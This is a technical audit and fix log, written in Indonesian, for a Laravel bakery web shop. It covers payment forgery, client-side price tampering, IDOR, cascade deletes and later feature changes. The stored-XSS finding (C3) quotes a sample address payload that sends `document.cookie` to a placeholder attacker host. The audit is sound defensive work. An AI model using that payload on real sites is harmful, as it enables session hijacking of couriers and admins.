# Audit Teknis — Toko Kue (Laravel 10)

Tanggal: 9 November 2026
Cakupan: arsitektur, alur bisnis, bug, dan keamanan (dibaca dari source, migration, view, dan konfigurasi).

Catatan: audit ini **tidak mengubah kode**. Semua temuan berbasis pembacaan kode + verifikasi HTTP.

---

## 0. Ringkasan Eksekutif

Aplikasi sudah berjalan dan alur dasarnya (login multi-role, katalog, keranjang, checkout, admin, kurir)
cukup lengkap. Namun ada **4 masalah kritis** yang harus dibereskan sebelum dipakai nyata:

1. **Pembayaran bisa dipalsukan** (`successLocal` menandai order `paid` tanpa verifikasi).
2. **Harga bisa dimanipulasi** (server percaya `total_harga` dan harga item dari browser).
3. **Stored XSS ke halaman kurir** lewat kolom `alamat` (bisa mencuri sesi kurir/admin).
4. **Risiko kehilangan data riwayat pesanan** karena `ON DELETE CASCADE` berantai
   (kategori → produk → order_items).

Selain itu, **alur pembayaran Midtrans saat ini belum bisa dipakai** karena kredensial
`MIDTRANS_*` belum ada di `.env`.

Skor kasar: **keamanan 4/10**, **kelengkapan fitur 7/10**, **kualitas kode 5/10**.

---

## 1. KRITIS

### C1. Pembayaran bisa dipalsukan — `successLocal`
**File:** `app/Http/Controllers/User/CheckoutController.php:107-116`
**Route:** `POST /checkout/success-local` (`routes/web.php:34`)

```php
$order = Order::where('snap_token', $request->snap_token)->first();
if ($order) { $order->payment_status = 'paid'; $order->save(); ... }
```

Masalah:
- Status `paid` di-set **hanya berdasarkan `snap_token` yang dikirim browser**. Tidak ada
  verifikasi ke Midtrans (signature / status transaksi).
- Tidak ada pengecekan `order->user_id === auth()->id()` → bisa menandai order milik orang lain
  jika tokennya diketahui.
- Dipanggil dari `onSuccess` di JS, yang bisa dipanggil manual lewat DevTools/curl.

**Dampak:** pembeli bisa melunasi pesanan tanpa membayar. Kerugian finansial langsung.
**Perbaikan:** hapus endpoint ini untuk produksi; satu-satunya sumber status bayar harus
webhook Midtrans yang tervalidasi signature. Jika perlu endpoint sinkronisasi, panggil
`Transaction::status($orderId)` dari server lalu cocokkan `gross_amount`.

---

### C2. Harga & total dipercaya dari client (price tampering)
**File:** `app/Http/Controllers/User/CheckoutController.php:17-71`
**File:** `resources/views/user/landing_page/menu.blade.php:1015-1023`

Request berisi `items` (JSON) + `total_harga` + `ongkir`, lalu:

```php
$order = Order::create([... 'total_harga' => $request->total_harga ...]);
foreach ($items as $item) { OrderItem::create([... 'harga_satuan' => $unitPrice ...]); }
```

Masalah:
- `harga_satuan` dan `total_harga` diambil dari payload client.
- `produk_id` tidak divalidasi (`exists:produks,id`), `quantity` tidak divalidasi (>0).
- `total_harga` hanya `numeric` → bisa negatif.
- `ongkir` juga dari client.

**Dampak:** user bisa membeli Rp1.000.000 dengan total Rp1.000, atau qty negatif.
**Perbaikan:** server **wajib** menghitung ulang dari DB:

```php
$items = collect($request->items)->map(function ($i) {
    $p = Produk::findOrFail($i['id']);
    return ['produk_id' => $p->id, 'jumlah' => max(1, (int)$i['quantity']), 'harga_satuan' => $p->harga];
});
$subtotal = $items->sum(fn($i) => $i['harga_satuan'] * $i['jumlah']);
$total = $subtotal + $ongkirDariServer;
```

---

### C3. Stored XSS di halaman kurir (eskalasi hak akses)
**File:** `resources/views/kurir/confirm_order.blade.php:461`

```blade
const alamat = {!! json_encode($order->alamat) !!};
```

`json_encode()` **tidak** meng-escape `</script>`. `alamat` berasal dari input pelanggan saat
checkout. Pelanggan bisa mengisi alamat:

```
</script><script>fetch('https://evil/?c='+document.cookie)</script>
```

Saat kurir membuka halaman konfirmasi, script berjalan di sesi **kurir** (dan bisa dipakai
untuk mengakses data order / aksi kurir). Ini jalur eskalasi dari "user biasa" ke "kurir".

Titik serupa: `resources/views/user/landing_page/home.blade.php:411,414` memakai
`addslashes()` di dalam `<script>` — `addslashes` juga tidak meng-escape `</script>`.

**Perbaikan:** gunakan `@json()` (Blade) atau `json_encode($v, JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT)`.
Idealnya kirim data lewat `data-*` yang di-escape `{{ }}` lalu di-`JSON.parse`.

---

### C4. `APP_DEBUG=true` + Ignition aktif
**File:** `.env` (`APP_DEBUG=true`), `.env.example` juga `APP_DEBUG=true`
`routes.txt` menunjukkan route `_ignition/execute-solution` aktif.

**Dampak:** jika di-deploy apa adanya, error page membocorkan stack trace, query, path, dan
variabel env. Riwayat CVE pada Ignition juga menjadikannya target. Ini bukan "bug lokal",
tapi bom waktu saat go-live.
**Perbaikan:** di produksi `APP_ENV=production`, `APP_DEBUG=false`, `php artisan config:cache`.

---

### C5. Penghapusan data berantai (CASCADE) menghapus riwayat pesanan
**File:**
- `database/migrations/2026_04_07_010645_create_produks_table.php:20` → `kategori_id ... onDelete('cascade')`
- `database/migrations/2026_05_09_123643_create_order_items_table.php:17` → `produk_id ... onDelete('cascade')`

Rantainya: hapus **kategori** → produk ikut terhapus → **order_items** ikut terhapus.
Artinya menghapus 1 kategori bisa menghapus baris item dari **pesanan lama** (nota jadi kosong,
laporan penjualan rusak).

**Perbaikan:**
- `order_items.produk_id` → `restrictOnDelete()` (atau `nullOnDelete` + simpan snapshot
  `nama_produk`/`harga_satuan` di order_items).
- `produks.kategori_id` → `restrictOnDelete()` atau larang hapus kategori yang masih dipakai.

---

## 2. TINGGI

### H1. Kurir bisa menyelesaikan pesanan kurir lain (IDOR)
`app/Http/Controllers/Kurir/DashboardController.php:60-91` — `completeDelivery()` hanya cek
`status === 'dikirim'`, **tidak** cek `kurir_id === auth()->guard('kurir')->id()`.
Kurir A bisa menyelesaikan/mengunggah bukti untuk order kurir B dengan menebak ID.
**Fix:** tambahkan cek kepemilikan + `abort_unless`.

### H2. Race condition saat kurir menerima order
`Kurir/DashboardController.php:43-55` — dua kurir bisa menekan "terima" bersamaan; keduanya
lolos karena cek status dan update tidak atomik.
**Fix:** `->where('status','menunggu_kurir')->update([...])` dan cek jumlah baris terpengaruh,
atau `lockForUpdate()` dalam transaksi.

### H3. Checkout tidak memvalidasi item
`CheckoutController.php:17-71` — `produk_id` tidak `exists`, `quantity` bisa 0/negatif, `items`
bisa berisi ID produk yang tidak ada → error 500 atau order aneh. Lihat C2.

### H4. `successLocal` tanpa cek kepemilikan order
Lihat C1. `Order::where('snap_token', ...)` tanpa `user_id`.

### H5. Tidak ada rate limiting pada login/register
`routes/web.php` tidak memakai `throttle`. `/login`, `/admin/login`, `/kurir/login`,
`/register` bisa di-brute-force.
**Fix:** `->middleware('throttle:5,1')` pada POST login, dan gunakan `RateLimiter` per email+IP.

### H6. File sensitif & sampah ikut ter-commit
`git ls-files` menunjukkan:
- `cookie.txt` — berisi cookie sesi `anis_bakery_session` + `XSRF-TOKEN` (walau terenkripsi,
  tetap tidak boleh masuk repo).
- `TokoKue6.zip` — **90 MB**, ikut ter-commit (repo jadi 143 MB).
- `routes.txt` — output `route:list` (info internal).

**Fix:** `git rm --cached cookie.txt TokoKue6.zip routes.txt`, tambahkan ke `.gitignore`,
dan bersihkan riwayat (`git filter-repo`) bila perlu.

### H7. Bug konfigurasi Midtrans di callback
`app/Http/Controllers/Api/MidtransCallbackController.php:16-17`

```php
Config::$isProduction = env('MIDTRANS_IS_PRODUCTION', false);
```

- `env()` langsung (bukan `config()`) → **rusak saat `config:cache`**.
- Nilai env `"false"` adalah string **truthy** → dianggap production.
- Tidak membandingkan `gross_amount` notifikasi dengan `order->total_harga`
  → notifikasi amount kecil bisa melunasi order besar (jika signature lolos).

**Fix:** pakai `config('services.midtrans.*')`, cast `(bool)`, dan verifikasi
`$notification->gross_amount == $order->total_harga` + `transaction_id` unik.

### H8. Pesan exception bocor ke client
`CheckoutController.php:101-104` mengembalikan `$e->getMessage()` mentah (bisa berisi path,
query SQL, konfigurasi). **Fix:** log detail, kirim pesan generik.

---

## 3. SEDANG

| # | Temuan | Lokasi | Dampak |
|---|--------|--------|--------|
| M1 | **Storefront wajib login** — `/`, `/menu`, `/our-story`, `/katering` dibungkus `auth`+`is_user`. Verifikasi: `curl /` → `302 /login`. | `routes/web.php:17-22` | Pengunjung baru tidak bisa melihat katalog sebelum daftar; konversi turun. Landing page biasanya publik. |
| M2 | **Route `admin.setting.update` tidak ada**, padahal form mem-POST ke situ | `routes/web.php:64` vs `resources/views/admin/setting/index.blade.php:18` | Menekan "Simpan" di Pengaturan → `RouteNotFoundException` (500). |
| M3 | **Method `show()` tidak ada** tapi `Route::resource` mendaftarkan route show | `routes/web.php:58-59`, `Admin/ProdukController`, `Admin/KategoriController` | `/admin/produk/{id}` & `/admin/kategori/{id}` → error "method does not exist". |
| M4 | **Mass assignment** `$request->all()` | `Admin/KategoriController.php:28,44`, `Admin/SettingController.php:43`, `Admin/ProdukController.php:35,63`; `Produk` & `Keranjang` `$guarded=[]` | Field di luar form bisa ikut tersimpan (mis. `id`, kolom internal, path gambar arbitrer). |
| M5 | **Review per-order, bukan per-produk** | `create_reviews_table` (tanpa `produk_id`), `HomeController.php:32-34` | Ulasan 1 item muncul di semua produk dalam order yang sama; rating tidak akurat. |
| M6 | **Review bisa dobel** | `UserOrderController.php:95-127`, tidak ada `unique(order_id)` | User bisa POST ulang → banyak ulasan untuk 1 order. |
| M7 | **Keranjang DB tidak dibersihkan setelah checkout** | `CheckoutController` (tidak ada delete `keranjang`) | Item lama tetap ada → risiko dobel pesan. |
| M8 | **Ongkir & total dihitung di browser** | `menu.blade.php:976-1023` | Bisa dimanipulasi (lihat C2); perhitungan harus di server. |
| M9 | **Password register minimal 4 karakter** | `AuthController.php:64` | Lemah; standar minimal 8 + cek password umum. |
| M10 | **Logout client tidak invalidate sesi** | `AuthController.php:47-51` | Hanya `Auth::logout()`, tanpa `invalidate()`/`regenerateToken()` (admin & kurir sudah benar). |
| M11 | **Pendapatan dashboard salah hitung** | `Admin/DashboardController.php:17` | `sum('total_harga')` untuk status `selesai` tanpa melihat `payment_status` → memasukkan order belum dibayar. |
| M12 | **Profil kurir: kolom tidak ada** | `Kurir/ProfileController.php:50-55`; tabel `users` tidak punya `kendaraan`, `plat_nomor` | Input kendaraan/plat nomor dibuang diam-diam. |
| M13 | **Upload 0777 + nama dari ekstensi asli** | `UserOrderController.php:111-114`, `Kurir/DashboardController.php:74-80` | Permission longgar; sebaiknya `$file->hashName()` dan permission 0755. |
| M14 | **Tabel `products` duplikat** | `2026_04_20_060553_create_products_table.php`, model `Product` | Skema ganda membingungkan; `products` tidak dipakai (dead code). |
| M15 | **Google OAuth redirect relatif** | `config/services.php:37` | Default `/auth/google/callback` bukan URL absolut → Google menolak. Set `GOOGLE_REDIRECT_URI` absolut. |
| M16 | **Kredensial Midtrans/Google kosong** | `.env` tidak punya `MIDTRANS_*` / `GOOGLE_*` | Checkout gagal total; tombol Google error `invalid_request`. |

---

## 4. RENDAH

- `RouteServiceProvider::HOME = '/home'` padahal route `/home` tidak ada.
- `config/cors.php` `allowed_origins => ['*']` (risiko kecil karena `supports_credentials=false`, tapi sebaiknya dibatasi).
- Tidak ada verifikasi email, lupa password, atau fitur "ingat saya".
- Tidak ada soft delete / audit log untuk order & produk.
- Tidak ada pagination di daftar admin (`->get()` semua) — akan lambat saat data besar.
- Tidak ada index eksplisit untuk `orders.user_id`, `orders.status`, `orders.kurir_id`.
- Status order tidak punya state machine (admin bisa lompat dari `baru` ke `selesai`).
- `OrderItem.jumlah` bisa 0/negatif (lihat C2).
- Tidak ada manajemen stok (tabel `produks` tidak punya kolom `stok`).
- `auth` guard `admin`/`kurir` memakai provider yang sama; konsisten tapi rawan salah pakai
  `Auth::check()` vs `Auth::guard(...)->check()`.
- `.env.example` tidak mendokumentasikan `MIDTRANS_*` dan `GOOGLE_*`.
- Duplikasi logika keranjang/checkout di beberapa blade (menu, detail, home) → sulit dirawat.

---

## 5. Yang Sudah Baik (jangan diubah)

- **CSRF** aktif di semua route web (`VerifyCsrfToken`, `@csrf` di form).
- **Tidak ada SQL injection** yang terdeteksi — semua query memakai Eloquent/Query Builder
  dengan binding; tidak ada `whereRaw`/`DB::raw` berisi input user.
- **Password di-hash** (bcrypt) dan `password` di-`$hidden`.
- **Role middleware** (`is_admin`, `is_kurir`, `is_user`) berfungsi memisahkan area.
- **Ownership check** sudah ada di `UserOrderController` (nota, complete, cancel, review).
- **Validasi upload** (image + mime + max size) sudah diterapkan.
- **Transaksi DB** dipakai di checkout (`beginTransaction`/`commit`/`rollBack`).
- Output Blade umumnya memakai `{{ }}` (ter-escape) — XSS hanya di titik `{!! ... !!}` yang
  disebut di C3.

---

## 6. Prioritas Perbaikan (urutan yang disarankan)

1. **C1 + H4** — matikan `successLocal`, andalkan webhook Midtrans tervalidasi.
2. **C2 + M8** — hitung ulang harga/ongkir/total di server, validasi item.
3. **C3** — ganti semua `{!! json_encode(...) !!}` dengan `@json()`.
4. **C5** — ubah FK jadi `restrictOnDelete`, simpan snapshot nama/harga di `order_items`.
5. **H1 + H2** — cek kepemilikan order di kurir + update atomik.
6. **H5** — throttle login/register.
7. **C4** — `APP_DEBUG=false` + `config:cache` untuk produksi.
8. **M1** — buka landing/menu untuk publik (pindahkan route ke luar grup `auth`).
9. **M2, M3** — tambah route setting update & method `show` (atau batasi resource).
10. **M4** — ganti `$request->all()` dengan `$request->only([...])` / `$request->validated()`.
11. **H6** — keluarkan `cookie.txt`, `TokoKue6.zip`, `routes.txt` dari repo.
12. **M5–M12** — perbaikan bertahap.

---

## 7. Bukti Verifikasi Cepat

```
GET /            -> 302 http://127.0.0.1:8000/login   (storefront wajib login)
GET /login       -> 200
route:list       -> admin/setting hanya GET (tidak ada update)
route:list       -> admin.produk.show & admin.kategori.show ada, method show tidak ada
git ls-files     -> cookie.txt, TokoKue6.zip (90 MB) ter-track
.env             -> APP_DEBUG=true, MIDTRANS_* & GOOGLE_* tidak ada
```

---

## 8. Status Perbaikan (9 November 2026)

Sudah dieksekusi dan diverifikasi:

| Temuan | Status | Perubahan |
|---|---|---|
| C1/H4 — pembayaran bisa dipalsukan | ✅ | `successLocal` memverifikasi `Transaction::status()` + kepemilikan order + `gross_amount` |
| C2/H3/M8 — harga dari client | ✅ | Harga, qty, subtotal, ongkir dihitung ulang dari DB; opsi varian divalidasi lewat `App\Support\ProdukOptions` |
| C3 — stored XSS | ✅ | Semua `{!! json_encode() !!}` & `addslashes()` diganti `@json()` (JSON_HEX_TAG/AMP/APOS/QUOT) |
| C4 — APP_DEBUG | ✅* | `.env.example` → `APP_ENV=production`, `APP_DEBUG=false`; `.env` lokal sengaja tetap debug |
| C5 — cascade menghapus riwayat | ✅ | FK `order_items.produk_id` & `produks.kategori_id` → `restrictOnDelete`; hapus produk/kategori dicegah di controller |
| H1/H2 — IDOR & race kurir | ✅ | Cek `kurir_id` + update atomik `where status/kurir_id` |
| H5 — brute force | ✅ | `throttle:10,1` pada login/register admin, kurir, user |
| H6 — file sensitif | ✅ | `cookie.txt`, `TokoKue6.zip`, `routes.txt` di-untrack + masuk `.gitignore` |
| H7 — callback Midtrans | ✅ | `config()`, `filter_var(...BOOLEAN)`, cocokkan `gross_amount` |
| H8 — exception bocor | ✅ | Detail hanya di-log, client menerima pesan generik |
| M1 — storefront wajib login | ✅ | `/`, `/menu`, `/menu/{id}`, `/our-story`, `/katering` publik |
| M2 — route setting update | ✅ | `PUT /admin/setting` ditambahkan |
| M3 — route `show` tanpa method | ✅ | Resource dibatasi `except(['show'])` |
| M4 — mass assignment | ✅ | `validated()` / `only()` + `$fillable` pada model |
| M6 — review dobel | ✅ | Cek `reviews()->exists()` + unique index `order_id` |
| M7 — keranjang tidak dibersihkan | ✅ | Keranjang dihapus dalam transaksi checkout |
| M9 — password lemah | ✅ | Minimal 8 karakter |
| M10 — logout tidak invalidate | ✅ | `invalidate()` + `regenerateToken()` |
| M11 — pendapatan salah | ✅ | Hanya status `selesai` + `payment_status=paid` |
| M12 — kolom kurir hilang | ✅ | Migrasi menambah `users.kendaraan`, `users.plat_nomor` |
| M13 — upload longgar | ✅ | `hashName()` + permission 0755 |
| M15 — redirect Google relatif | ✅ | Default absolut dari `APP_URL` |
| M16 — kredensial kosong | ⚠️ | Variabel didokumentasikan; **isi `MIDTRANS_*`/`GOOGLE_*` di `.env` agar checkout & login Google aktif** |
| M5 — review per-produk | ✅ | `reviews.produk_id` + unique `(order_id, produk_id)`; form ulasan per item, halaman produk hanya menampilkan ulasan produknya, `rating_avg` produk ikut diperbarui |
| M14 — tabel `products` duplikat | ✅ | Model `Product` dihapus + migrasi `dropIfExists('products')` |

Verifikasi HTTP terakhir: `/`, `/menu`, `/menu/1`, `/our-story`, `/katering` → 200;
area user/admin/kurir terproteksi → 302 ke login masing-masing; login 3 role berhasil;
`admin.setting` PUT berhasil; `view:cache` & `config:cache` berhasil.

Verifikasi ulasan per-produk (data uji sementara, sudah dibersihkan):
order dengan 2 produk → form ulasan muncul untuk masing-masing produk; setelah produk 1
diulas, form produk 2 tetap muncul dan ulasan produk 1 menjadi read-only; setelah keduanya
diulas, order pindah ke tab riwayat. Halaman produk 1 hanya menampilkan ulasan produk 1,
halaman produk 2 hanya ulasan produk 2. Ulasan duplikat ditolak (`302` tanpa baris baru),
produk di luar order ditolak (`404`), dan `produks.rating_avg` ter-update (5.00 & 4.00).

## Alur status pesanan dipatenkan

Order::ADMIN_TRANSITIONS menjadi sumber aturan transisi:
- Admin: `baru -> disiapkan -> menunggu_kurir`, plus `dibatalkan` selama belum dikirim.
- Admin boleh menarik kembali `menunggu_kurir -> disiapkan` hanya jika kurir belum mengambil.
- `dikirim` dan `selesai` hanya lewat aksi kurir (`acceptOrder` / `completeDelivery`); customer tetap bisa menandai selesai dari `dikirim`.
- Update status admin bersifat atomik dan menolak jika kurir sudah menerima pesanan.
- Saat `menunggu_kurir`, ongkir bisa diperbarui dan `total_harga` dihitung ulang (subtotal + ongkir).

Verifikasi: `baru -> dikirim` ditolak; `baru -> disiapkan` diterima; `disiapkan -> menunggu_kurir` (ongkir 18.000) diterima dan total menjadi 168.000; `menunggu_kurir -> dikirim` ditolak; kurir menerima -> `dikirim` + `kurir_id`; admin `dikirim -> selesai/dibatalkan` ditolak.

## Audit lanjutan (13 Nov 2026) — 9 temuan diperbaiki

Semua temuan di bawah sudah diperbaiki dan diverifikasi.

1. **Pembayaran hanya bergantung webhook (kritis).** Route `POST /checkout/success-local`
   (`user.checkout.success_local`) diaktifkan kembali; keempat handler Snap (`onSuccess`)
   di `menu.blade.php` (2) dan `detail.blade.php` (2) kini POST ke route itu dengan
   `snap_token`, lalu redirect. Verifikasi tetap server-side ke API Midtrans.
2. **Ulasan mock di halaman produk.** Blok ulasan karangan (Aditya/Siti/Budi, rating 4.7)
   di `detail.blade.php` dihapus; kini `$averageRating = $reviews->avg('rating') ?? 0`
   dan ada empty-state "Belum ada ulasan".
3. **Opsi/varian tak muncul di /menu.** Modal kini memakai `App\Support\ProdukOptions::for($produk)`
   (bukan `$produk->options` yang tak ada kolomnya).
4. **Statistik palsu di /menu.** `$rating`/`$sold`/`$reviews` kini dari kolom asli
   (`rating_avg`, `terjual`, `reviews_count` via `withCount('reviews')`); badge
   "🔥 Best Seller" hanya bila `is_promo`.
5. **Total keranjang bisa dimanipulasi.** `KeranjangController::store()` & `update()`
   menghitung harga server-side termasuk biaya opsi (`ProdukOptions::unitPrice`);
   opsi tak dikenal ditolak `422`. `total_harga` dari browser diabaikan.
6. **Setting kosong.** `Admin\SettingController::update()` memakai `firstOrCreate` agar
   tidak error saat baris `settings` belum ada.
7. **Login tanpa validasi.** `AuthController::login()` memakai `$request->validate()`
   (email wajib format email).
8. **Logout separuh.** `AuthController::logout()` logout guard `web`, `admin`, dan `kurir`.
9. **Resolusi gambar tak konsisten.** `home.blade.php` & `detail.blade.php` kini mengenali
   path `assets/` seperti `menu.blade.php`.

Dua bug tambahan ditemukan saat verifikasi dan ikut diperbaiki:

10. **`ProdukOptions::isCake()` salah klasifikasi "cupcake".** Pencocokan substring
    membuat "Cupcake Vanilla Drizzle" dianggap kue ukuran (opsi ukuran/lilin), sehingga
    opsi varian tidak tampil dan harga opsi tidak dihitung. Kini memakai word-boundary
    (`\bcake\b`, `\btart\b`) + kategori "ulang tahun".
11. **`Order::markPaid()` (idempoten).** Set `payment_status=paid`; `baru -> disiapkan`;
    increment `produks.terjual` per item dalam `DB::transaction`. Dipakai oleh
    `MidtransCallbackController` dan `CheckoutController::successLocal`.
    Webhook memetakan `transaction_status` ke `payment_status`; panggilan kedua tidak
    menggandakan `terjual`.

Verifikasi: `php -l` seluruh file yang diubah lolos; `view:cache` OK; HTTP `/`, `/menu`,
`/menu/1`, `/login` = 200; `node --check` semua `<script>` halaman menu & detail = 0 error;
uji keranjang: `update(jumlah=3, total_harga=1)` -> server menghitung `120.000`
(25.000 + 15.000 opsi) × 3; opsi tak dikenal -> `422`; uji `markPaid()` status `baru ->
disiapkan`, `terjual` naik (p1=2, p2=1), pemanggilan kedua tidak menggandakan.

## Perbaikan 13 Nov 2026 (lanjutan) — peta & modal keranjang

12. **Peta Leaflet menembus header/modal.** Akar: div `#map` tidak punya `position`
    sehingga `z-index: 1` diabaikan dan pane/kontrol Leaflet (`z-index` 400–1000)
    lolos dari konteks tumpukan modal. Perbaikan: container peta diberi
    `position: relative; z-index: 0; isolation: isolate;` dan div peta
    `position: relative; z-index: 0;` pada `menu.blade.php`, `detail.blade.php`,
    `kurir/confirm_order.blade.php`, `user/profile.blade.php`,
    `admin/order/show.blade.php`; ditambah aturan global
    `.leaflet-container { position: relative; z-index: 0; }` di `public/assets/user/css/style.css`.
13. **Bug scope `savedCustLat/Lng`.** Variabel dideklarasikan di dalam
    `DOMContentLoaded` (blok `<script>` pertama) tetapi dibaca oleh `initMap()`
    di blok `<script>` kedua → `ReferenceError` saat modal order dibuka sehingga
    rute/ongkir tidak pernah dihitung (tampil `Rp 0 (Pilih Lokasi)`).
    Perbaikan: ekspos ke `window.savedCustLat`/`window.savedCustLng` dan `initMap()` membaca dari `window`.
14. **Peta + ongkir di modal keranjang.** `showCartModal()` kini menampilkan peta
    `#cartMap` (Leaflet + routing), jarak, serta baris Subtotal/Ongkos Kirim/Total
    yang diperbarui realtime (`initCartMap()`, `updateCartTotals()`, `updateCartAddress()`).
    ID field keranjang dijadikan unik (`cartCustName`/`cartCustPhone`/`cartCustAddress`)
    agar tidak bentrok dengan modal order, dan `sendCartToMidtransWithPayment()` membaca ID baru.

Verifikasi: `view:cache` OK; HTTP `/`, `/menu`, `/menu/1`, `/login`, `/register` = 200;
`node --check` seluruh `<script>` halaman menu (3 blok) & detail (3 blok) = 0 error.

15. **Header modal tertimpa konten (peta & preview gambar).** Header modal
    (`#orderModal`, `#cartModal` di `menu.blade.php`; `#buyNowModal`, `#cartModal`
    di `detail.blade.php`) tidak punya `z-index`, sehingga elemen ber-`transform`
    (`.variant-preview` yang dianimasikan `floatEmpty`) dan container peta
    (`z-index: 0`) melukis di atas header sticky. Perbaikan: semua header modal diberi
    `z-index: 20` (header sticky/relative), sehingga tetap menutup konten yang bergulir.
16. **Keranjang localStorage tidak terpisah per akun.** Semua akun memakai kunci
    yang sama (`sweetSavoryCart`), sehingga keranjang akun demo terbaca oleh akun lain
    di browser yang sama. Perbaikan: `resources/views/user/layouts/app.blade.php`
    menetapkan `window.CART_USER_SCOPE` (`u{id}` untuk user login, `guest` untuk tamu)
    dan `window.CART_KEY = 'sweetSavoryCart_' + scope` (plus `window.GALLERY_CART_KEY`),
    dipakai `menu.blade.php`, `detail.blade.php`, dan `home.blade.php`. Saat user login,
    isi keranjang tamu (`sweetSavoryCart_guest`) dipindahkan ke keranjang akun lalu
    dihapus, agar tidak tercampur antar akun.

Verifikasi tambahan: login `client@tokokue.com` → `CART_USER_SCOPE = 'u3'`, tamu → `guest`;
`localStorage` pada /menu memakai `window.CART_KEY` (13 pemanggilan); header modal
`z-index: 20` muncul 2× di /menu dan 2× di /menu/1; `node --check` 11 blok script = 0 error.
---

## Katalog asli Dear Seana (16 Nov 2026)

Sumber: `Katalog Dear Seana.pdf` (12 halaman). Data dimasukkan lewat migrasi
`2026_11_16_000001_add_is_active_and_has_options_to_produks_table.php` dan seeder
`database/seeders/DearSeanaCatalogSeeder.php`.

- Kolom baru `produks.is_active` (default true) dan `produks.has_options` (default false).
  `is_active = false` menyembunyikan produk dari storefront tanpa menghapus riwayat order.
  `has_options = false` mematikan opsi varian generik (produk sudah spesifik, mis. ukuran).
- 27 produk aktif (hanya item yang punya harga di katalog): Kue Kering 6 (Rp 125.000),
  Dessert 11 (Rp 100.000-300.000), Kue Ulang Tahun 1 (mulai Rp 350.000),
  Savoury 6 (Rp 25.000-45.000), Hampers 3 (Rp 300.000-475.000).
  Item Snacks & Sweet Treats (24 produk tanpa harga) dihapus atas permintaan user.
- 5 produk demo dinonaktifkan: Dark Chocolate Bliss, Cupcake Vanilla Drizzle,
  Celebration Tart, Fudgy Melted Brownie, pukis. Riwayat order (id 6, 8, 9, 11, 13)
  tetap merujuk produk tersebut.
- Storefront memfilter `is_active = true`; checkout juga mensyaratkan `harga > 0`
  (`HomeController`, `KeranjangController`, `CheckoutController`).
- Produk harga 0 tetap tampil di `/menu` dan `/menu/{id}` dengan label "Hubungi Admin"
  dan tombol WhatsApp; tombol keranjang/beli tidak dirender.
- Gambar memakai aset terdekat di `public/assets/img_produk` (semua path dicek ada).

Verifikasi: migrasi + seeder OK; 51 aktif / 5 nonaktif; semua gambar ada; `view:cache` OK;
lint PHP semua file terkait OK; HTTP `/`, `/menu`, `/menu/6`, `/menu/56`, `/our-story`,
`/katering`, `/login`, `/admin/produk` = 200; `node --check` 4 halaman = 0 error;
tambah produk berharga ke keranjang = 200, produk harga 0 = 422
("Produk tidak tersedia untuk dipesan"); beranda hanya menampilkan produk berharga.- Statistik palsu dihapus: kartu produk menampilkan "Baru" bila belum ada penjualan/ulasan
  (bukan "0.0 / 0+ terjual"), dan detail produk memakai `produk->terjual` asli
  (sebelumnya hardcoded "100+ Terjual").
## Chatbot penjualan 24/7 (16 Nov 2026)

Fitur chatbot berbasis aturan (rule-based), tanpa API key dan tanpa biaya:
- `app/Support/SalesChatbot.php` - mesin intent + jawaban memakai data produk asli.
  Mampu menjawab: harga/detail produk, rekomendasi (termasuk berdasarkan budget),
  daftar kategori/katalog, stok, ongkir, metode pembayaran, cara pesan,
  custom cake/hampers, jam operasional, dan kontak admin.
- `app/Http/Controllers/ChatbotController.php` + route publik `POST /chatbot`
  (`throttle:40,1`, validasi `message` wajib, maks 500 karakter).
- Widget mengambang di `resources/views/user/layouts/app.blade.php`
  (`#chatWidget`, `#chatPanel`, `#chatForm`) dengan quick-reply chips,
  indikator "sedang mengetik", dan penanganan error koneksi.
  Gaya di `public/assets/user/css/style.css` (prefix `.chat-*`, z-index 900).
- Produk tanpa harga dan produk nonaktif tidak pernah muncul di jawaban chatbot.

Verifikasi: `php -l` OK; `view:cache` OK; HTTP `/`, `/menu`, `/menu/6` = 200;
9 skenario percakapan diuji langsung (sapaan, harga nastar, budget 150rb, ongkir,
pembayaran, cara pesan, stok, custom cake, hampers, katalog, dimsum, fallback);
`POST /chatbot` dengan CSRF = 200 berisi produk asli; pesan kosong = 422;
`node --check` 5 blok script halaman = 0 error.
## Login-first di landing page (16 Nov 2026)

- Tombol "Tambah ke Keranjang" dan "Pesan Sekarang" pada modal galeri
  esources/views/user/landing_page/home.blade.php kini mewajibkan login.
- Tamu yang menekan tombol mendapat toast "Silakan login dulu untuk memesan"
  lalu diarahkan ke halaman login (`const IS_AUTH` dari `auth()->check()`).
- Item galeri sekarang membawa `id` produk asli dan `url` detail
  (`route('menu.show')`), dan disimpan ke keranjang utama `window.CART_KEY`
  dengan bentuk item yang sama seperti halaman menu
  (`{id, name, base_price, selections, quantity, total_price}`) sehingga
  langsung terbaca di halaman menu/checkout (sebelumnya memakai kunci
  `GALLERY_CART_KEY` yang terpisah dan tidak pernah terbaca).
- Tombol "Pesan Sekarang" untuk user yang sudah login mengarah ke halaman
  detail produk agar bisa memilih ukuran/jumlah dan titik pengiriman.
- Verifikasi: `view:cache` OK; HTTP `/` = 200; `IS_AUTH = false` untuk tamu
  dan `true` setelah login `client@tokokue.com`; `node --check` 4-5 blok
  script halaman = 0 error.
## Wajib login untuk keranjang & form pesanan (16 Nov 2026)

- Global: esources/views/user/layouts/app.blade.php menambah
  `window.IS_AUTH` (`auth()->check()`) dan `window.LOGIN_URL`.
- `menu.blade.php`: equireLogin() membungkus `showCartModal()`,
  `openModal()`, dan `addToCart()`; loader keranjang mengosongkan
  `CART_KEY`/`GALLERY_CART_KEY` untuk tamu; badge keranjang tidak tampil
  untuk tamu.
- `detail.blade.php`: `requireLogin()` membungkus `addToCart()`,
  `showCartModal()`, `showBuyNowModal()`, dan
  `sendCartToMidtransWithPayment()`; loader keranjang juga mengosongkan
  penyimpanan untuk tamu.
- `home.blade.php`: keranjang hanya dimuat untuk user login; tamu tidak
  menyimpan item.
- Penanganan error checkout diperbaiki: respons 401/419/redirect (sesi habis
  atau tamu) tidak lagi memunculkan alert "Terjadi kesalahan jaringan",
  melainkan toast "Silakan login dulu" lalu diarahkan ke halaman login.
- Verifikasi: `view:cache` OK; guest `/menu` & `/menu/6` = 200 dengan
  `IS_AUTH = false`; setelah login `IS_AUTH = true`; `node --check`
  5 blok script per halaman = 0 error; `POST /checkout` tamu = 419 (ditangani
  oleh guard JS).
## Logo/favicon situs (16 Nov 2026)

- Dibuat ikon merek: bunga daisy emas + bunga kecil lilac di atas latar krem
  (`#FFF8F0`, aksen `#F7D98A`/`#E8B64C`/`#CDB6E6`), bentuk sederhana agar
  tetap terbaca di ukuran 16px.
- Aset baru di `public/assets/img_produk/`: `favicon-16.png`,
